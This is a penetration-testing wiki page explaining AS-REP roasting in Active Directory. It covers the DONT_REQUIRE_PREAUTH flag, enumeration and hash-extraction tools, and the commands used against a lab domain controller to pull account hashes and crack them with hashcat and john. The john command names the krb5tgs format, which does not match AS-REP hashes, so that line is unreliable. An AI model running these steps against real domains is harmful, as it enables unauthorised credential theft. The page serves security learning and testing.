# AS-REP Roast

## Attack Description

AS-REP Roasting is an attack against Kerberos that targets user accounts that do not require Kerberos pre-authentication. The flag 'UF\_DONT\_REQUIRE\_PREAUTH' , is found in the user's properties under the 'userAccountControl' attribute. This attribute is normally displayed as a decimal or hexidecimal value, which is calculated based on the sum of the values for the required flags.

For example, a user may have the following setting, which equals a decimal value of '4260352':

userAccountControl 0x410200 = (NORMAL\_ACCOUNT | __ DONT\_EXPIRE\_PASSWORD | DONT\_REQUIRE\_PREAUTH)

> FLAG                                       HEX               DECIMAL\
> NORMAL\_ACCOUNT             0x0200         512\
> DONT\_EXPIRE\_PASSWORD   0x10000       65536\
> DONT\_REQ\_PREAUTH           0x400000    4194304\
> \
> 512+65536+4194304=4260352

Below is a diagram which shows the Kerberos authentication process. What is important to note is that the AS-REP packet is a response to the AS-REQ packet, and so if the 'DONT\_REQUIRE\_PREAUTH' flag is enabled, anyone can send an AS-REQ packet and retrieve the TGT hash for the specified account.

![Source: https://adsecurity.org/?p=1667](../../.gitbook/assets/kerberos\_tickets1.JPG)

## Attack tools

The list of tools below contains some of the tools that can be used for this attack. Note that some of the listed tools do the same thing, and so it's down to user preference as to which tools are used. In order to complete this attack, we need to do the following, and so any tool that can assist with providing the following functionality can be used:

* Query AD and extract data including user account information
* Find an account (user, service) which has the 'DONT\_REQUIRE\_PREAUTH' flag enabled
* Extract the TGT hash for the account
* Crack the hash

### Tools:

ldapsearch --> opens a connection to a LDAP server, binds, and performs a search using specified parameters

windapsearch --> enumerate users, groups and computers from a Windows domain through LDAP queries (based on ldapsearch, but contains built in LDAP queries via options)

GetNPUsers.py (Impacket) --> queries AD for TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ set (UF\_DONT\_REQUIRE\_PREAUTH)

hashcat --> crack the hash

john --> crack the hash

## Attack Example

### Discovery

First, we need to determine if we are able to query the target directory server using LDAP as an anonymous user. If successful, we can query the directory database anonymously.&#x20;

> NOTE: Being able to query the database anonymously is NOT a requirement, it can also be done with a valid domain user account. The important thing to note is that in order for this attack to succeed, we need to be able to query the database.

Using ldapsearch:

```
ldapsearch -h 10.99.99.101 -p 389 -x -b "dc=testdomain,dc=local"
```

Using windapsearch:

```
windapsearch.py --dc-ip 10.99.99.101
```

Next, we need to query the directory for accounts that have the 'DONT\_REQUIRE\_PREAUTH' flag enabled:

Using GetNPUsers.py (Impacket):

```
GetNPUsers.py testdomain.local/ -dc-ip 10.99.99.101
```

### Exploit

Once we have found an account with the 'DONT\_REQUIRE\_PREAUTH' flag enabled, we can extract the TGT hash for the account. To do this, we can use GetNPUsers.py from Impacket.

```
GetNPUsers.py testdomain.local/username -dc-ip 10.99.99.101 -format hashcat -outputfile tgt.hashcat
GetNPUsers.py testdomain.local/username -dc-ip 10.99.99.101 -format john -outputfile tgt.john
```

Finally, all that is left to do is to crack the hash:

Using hashcat:

```
hashcat -m 18200 --force tgt.hashcat /usr/share/wordlists/rockyou.txt 
```

Using john:

```
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgt.john
```



## References

{% embed url="https://attack.mitre.org/techniques/T1558/004" %}

{% embed url="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties" %}

{% embed url="http://www.selfadsi.org/ads-attributes/user-userAccountControl.htm" %}

{% embed url="https://techcommunity.microsoft.com/t5/security-compliance-and-identity/helping-protect-against-as-rep-roasting-with-microsoft-defender/ba-p/2244089" %}

{% embed url="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps" %}

{% embed url="https://github.com/ropnop/windapsearch" %}

{% embed url="https://linux.die.net/man/1/ldapsearch" %}

{% embed url="https://github.com/SecureAuthCorp/impacket" %}
